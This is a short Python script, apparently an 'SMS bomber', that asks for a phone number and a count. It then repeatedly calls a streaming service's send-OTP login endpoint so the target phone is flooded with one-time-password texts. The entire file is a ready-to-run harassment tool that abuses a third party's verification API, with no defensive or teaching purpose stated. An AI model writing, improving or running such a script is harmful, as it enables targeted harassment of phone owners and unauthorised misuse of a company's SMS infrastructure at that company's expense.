# -*- coding: utf-8 -*-
import time,sys
import requests
logo= '''
 __  __             ___      __            _ ____    
 \ \/ /___ ______  / __|_ _ /  \__ __ ____| |__ /_ _ 
  >  </ _ (_-(_-< | (__| '_| () \ V  V / _` ||_ | '_|
 /_/\_\___/__/__/  \___|_|  \__/ \_/\_/\__,_|___|_|  
                                                                         
'''
def logop(z):
    for word in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)
logop(logo)
number=str(input("[>]Enter The Number : "))
amount=int(input("[>] Enter The Amount : "))
api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
for i in range(amount):
	requests.get(api)
print(str(i+1)+" [√]SMS Sent")


